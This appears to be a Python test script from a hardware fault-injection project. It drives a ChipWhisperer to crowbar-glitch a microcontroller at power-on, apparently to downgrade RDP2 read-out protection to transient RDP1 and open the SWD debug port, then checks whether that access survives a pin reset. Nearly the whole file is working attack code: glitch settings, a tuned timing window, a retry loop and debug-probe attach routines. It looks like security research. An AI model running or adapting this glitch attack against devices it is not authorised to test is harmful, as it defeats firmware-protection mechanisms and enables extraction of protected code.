#!/usr/bin/env python
"""test_rdp1_holds_nrst.py - does the glitch-1 transient RDP1 survive an NRST?

Make-or-break for the FPB-after-glitch-1 path. If the RDP option-latch is purely
a power-on event (as the power-on glitch-1 result implies), then a PIN reset
(NRST) should NOT re-assert RDP2 - the transient RDP1 (and open SWD) should hold
through an NRST, and only a full power-cycle drops back to RDP2.

Test:
  1. power-on glitch-1 (BOOT0 low, crowbar, ext camped in the 2.6-4.6us window)
     until SWD enumerates = transient RDP1 achieved.
  2. detach, pulse NRST (power stays ON - no power-cycle).
  3. re-attach SWD.
  -> SWD still enumerates  => RDP1 HELD through NRST. FPB-via-NRST is viable.
  -> SWD attach fails      => RDP2 re-asserted (or chip dead). Path is dead.

Read-only + crowbar. No writes.
"""
import os, sys, time, glob, fcntl, random
import chipwhisperer as cw

CLKGEN = 100e6
REPEAT = 20
OFFSET = -45
EXT_LO, EXT_HI = 240, 480        # the proven glitch-1 hot window (2.4-4.8us)
POWER_OFF_MS = 60
MAX_ATTEMPTS = int(os.environ.get('MAXA', 400))
scope = None


def usbreset():
    RST = (ord('U') << 8) | 20
    for d in glob.glob('/sys/bus/usb/devices/*'):
        try:
            if open(d+'/idVendor').read().strip()=='0483' and \
               open(d+'/idProduct').read().strip()=='3748':
                b=int(open(d+'/busnum').read()); n=int(open(d+'/devnum').read())
                fd=os.open(f'/dev/bus/usb/{b:03d}/{n:03d}', os.O_WRONLY)
                fcntl.ioctl(fd, RST, 0); os.close(fd); return
        except OSError:
            continue


def swd_try():
    """Attempt SWD attach. Return (ok, info). Frees the handle after."""
    try:
        from swd.stlink import Stlink
        st = Stlink(swd_frequency=1000000)
        idc = st.get_idcode()
        try:
            optcr = st.get_mem32(0x40023C14); rdp = (optcr >> 8) & 0xFF
        except Exception:
            optcr = rdp = -1
        info = f'IDCODE=0x{idc:08x} OPTCR=0x{optcr:08x} RDP=0x{rdp:02x}'
        del st
        import gc; gc.collect()
        return True, info
    except Exception as e:
        return False, type(e).__name__


def setup():
    s = cw.scope()
    s.clock.clkgen_freq = CLKGEN
    s.adc.samples = 24400
    s.glitch.clk_src = 'clkgen'
    s.glitch.output = 'enable_only'
    s.glitch.trigger_src = 'ext_single'
    s.glitch.width = 40
    s.glitch.offset = OFFSET
    s.glitch.repeat = REPEAT
    s.io.glitch_lp = True
    s.io.glitch_hp = True
    s.trigger.triggers = 'tio4'          # POR-release edge
    s.io.tio4 = 'high_z'
    s.io.tio1 = False                    # BOOT0 low -> firmware/SWD path
    s.io.tio2 = 'high_z'
    s.io.tio3 = 'high_z'
    s.io.target_pwr = True
    return s


def power_on_glitch(ext):
    scope.glitch.ext_offset = ext
    scope.io.tio4 = 'high_z'
    scope.io.target_pwr = False
    time.sleep(POWER_OFF_MS/1000.0)
    scope.arm()
    scope.io.target_pwr = True


def main():
    global scope
    scope = setup()
    print(f'[+] hunting glitch-1 SWD-open (ext {EXT_LO}-{EXT_HI}, up to {MAX_ATTEMPTS} shots)...')
    opened = False
    for i in range(1, MAX_ATTEMPTS+1):
        ext = random.randint(EXT_LO, EXT_HI)
        power_on_glitch(ext)
        time.sleep(0.12)
        ok, info = swd_try()
        if ok:
            print(f'[+] #{i} ext={ext} -> SWD OPEN (RDP1): {info}')
            opened = True
            break
        if i % 40 == 0:
            print(f'    ...{i} shots, no SWD yet')
    if not opened:
        print('[!] glitch-1 never opened SWD in this run - try again (it is ~1/35).')
        return finish(1)

    # --- THE TEST: NRST (no power-cycle), then re-check SWD ---
    print('[+] pulsing NRST (power stays ON, no power-cycle)...')
    scope.io.tio4 = 'gpio_low'
    time.sleep(0.05)
    scope.io.tio4 = 'high_z'
    time.sleep(0.3)
    ok2, info2 = swd_try()
    print()
    if ok2:
        print(f'[VERDICT] *** RDP1 HELD THROUGH NRST *** SWD still up: {info2}')
        print('          -> FPB-after-glitch-1 via NRST is VIABLE (no power-cycle, no caps).')
        rc = 0
    else:
        print(f'[VERDICT] SWD DEAD after NRST ({info2}) -> RDP2 re-asserted or chip reset.')
        print('          -> the option-latch re-runs on NRST; FPB-via-NRST is dead. Use glitch-2.')
        rc = 1
    return finish(rc)


def finish(rc):
    try:
        scope.io.glitch_hp = False; scope.io.glitch_lp = False
        scope.io.target_pwr = False
        scope.dis()
    except Exception:
        pass
    return rc


if __name__ == '__main__':
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        finish(1)
